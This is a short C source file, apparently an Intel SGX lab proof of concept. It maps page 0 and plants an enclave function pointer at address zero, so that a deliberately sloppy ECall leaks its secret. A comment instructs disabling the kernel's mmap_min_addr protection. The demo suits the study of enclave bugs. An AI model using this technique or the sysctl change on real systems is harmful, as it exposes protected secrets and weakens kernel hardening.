// file: steal.c
#include <sys/mman.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <unistd.h>
#include <ucontext.h>

#include "sgx_urts.h"
#include "App.h"
#include "Enclave_u.h"

#define ENCLAVE_PATH "enclave.signed.so"

sgx_status_t enclave_init();
sgx_enclave_id_t enclave_id;

int main() {
    /* Initialize the enclave */
    sgx_status_t ret = enclave_init();

    /* Make NULL pointer deference valid */
    void* page0_mmapped = mmap(0, 4096, PROT_READ | PROT_WRITE,
                               MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (page0_mmapped == MAP_FAILED) {
        /* Be sure to run command `sysctl -w vm.mmap_min_addr="0"` before
         * running this program!!!! */
        perror("Memory-map at page 0 failed");
        exit(-1);
    }
    /* Set the value at address 0 as a pointer to the function inside enclave
     * that prints string */
    uint64_t ocall_print_addr;
    enclave_get_address_of_ocall_print(enclave_id, &ocall_print_addr);
    *(void**)0 = (void*)ocall_print_addr;

    /* Call a sloppy implementation of ECall that leaks secret */
    ecall_process_secret_sloppily(enclave_id);

    return 0;
}

sgx_status_t enclave_init() {
    sgx_status_t ret = SGX_SUCCESS;
    sgx_launch_token_t launch_token;
    int launch_token_update = 0;
    sgx_status_t status = SGX_SUCCESS;

    ret = sgx_create_enclave(ENCLAVE_PATH, SGX_DEBUG_FLAG, &launch_token,
       &launch_token_update, &enclave_id, NULL);

    if (SGX_SUCCESS != ret) {
        fprintf(stdout, "Create enclave failed [%s]. %u\n", __FUNCTION__, ret);
    }
    return ret;
}

/* OCall functions */
void ocall_print_string(const char *str)
{
    /* Proxy/Bridge will check the length and null-terminate
     * the input string to prevent buffer overflow.
     */
    printf("%s", str);
}
